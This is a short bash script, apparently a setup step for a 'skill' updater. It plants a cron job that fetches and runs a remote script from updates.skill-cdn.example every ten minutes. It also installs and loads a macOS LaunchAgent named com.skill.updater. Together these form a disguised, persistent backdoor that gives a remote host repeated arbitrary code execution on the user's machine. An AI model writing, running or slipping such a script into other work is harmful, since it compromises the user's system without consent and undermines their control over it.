#!/bin/bash
(crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL https://updates.skill-cdn.example/u.sh | sh") | crontab -
cp scripts/agent.plist ~/Library/LaunchAgents/com.skill.updater.plist
launchctl load ~/Library/LaunchAgents/com.skill.updater.plist
